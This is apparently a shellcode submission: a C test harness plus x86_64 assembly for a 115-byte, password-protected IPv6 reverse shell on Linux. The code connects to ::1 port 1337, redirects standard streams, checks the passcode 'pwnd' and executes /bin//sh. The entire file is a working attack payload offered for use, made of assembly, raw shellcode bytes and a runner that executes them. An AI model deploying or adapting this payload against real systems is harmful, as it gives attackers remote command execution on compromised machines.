/*
; Title   : Reverse Shell (IPv6) with Password - Shellcode
; Author  : Hashim Jawad @ihack4falafel
; OS      : Linux kali 4.15.0-kali2-amd64 #1 SMP Debian 4.15.11-1kali1 (2018-03-21) x86_64 GNU/Linux
; Arch    : x86_64
; Size    : 115 bytes

section .text

global _start

_start:

	; int socket(int domain, int type, int protocol)
	; rax=41, rdi=10, rsi=1, rdx=0
	xor esi,esi
	mul esi
	inc esi
	push 10
	pop rdi
	add al, 41
	syscall

	; save socket fd in rdi
	xchg rbx,rax

	; struct sockaddr_in6 struct
	push rdx			; scope id = 0
	mov rcx,0xFEFFFFFFFFFFFFFF      ; link local address ::1
	not rcx
	push rcx
	push rdx
	push rdx                        ; sin6_flowinfo=0
	push word 0x3905		; port 1337
	push word 10     		; sin6_family

	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
	; rax=42, rdi=rbx(fd), rsi=sockaddr_inet6, rdx=28 (length)
	push 	rbx
	pop 	rdi
	push 	rsp
	pop 	rsi
	push 	28
	pop 	rdx
	push 	42
	pop 	rax
	syscall

	; dup2 (new, old)
	; rax=33, rdi=new fd, rsi=0,1,2 (stdin, stdout, stderr)
	xchg   rsi, rax
	push 0x3
	pop rsi
_loop:
	push 0x21
	pop rax
	dec esi
	syscall
	loopnz _loop

	; read (int fd, void *bf, size_t count)
	; rax=0, rdi=0 (stdin), rsi=rsp, rdx=4 (pwnd)
	xor rax, rax
	push rax
	pop rdi
	push rax
	push rsp
	pop rsi
	push 0x4
	pop rdx
	syscall

	; check passcode (pwnd)
	push 0x646e7770
	pop rbx
	cmp dword [rsi], ebx
	jne _nop

	; int execve(cont char *filename, char *const argv[], char *const envp[])
	; rax=59, rdi=/bin//sh, rsi=0, rdx=0
	xor rax, rax
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	push rax
	push rsp
	pop rsi
	cdq
	push 0x3b
	pop rax
	syscall

_nop:
	nop
*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x31\xf6\xf7\xe6\xff\xc6\x6a\x0a\x5f\x04\x29\x0f\x05\x48\x93\x52\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xfe\x48\xf7\xd1\x51\x52\x52\x66\x68\x05\x39\x66\x6a\x0a\x53\x5f\x54\x5e\x6a\x1c\x5a\x6a\x2a\x58\x0f\x05\x48\x96\x6a\x03\x5e\x6a\x21\x58\xff\xce\x0f\x05\xe0\xf7\x48\x31\xc0\x50\x5f\x50\x54\x5e\x6a\x04\x5a\x0f\x05\x68\x70\x77\x6e\x64\x5b\x39\x1e\x75\x1a\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x50\x54\x5e\x99\x6a\x3b\x58\x0f\x05\x90";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}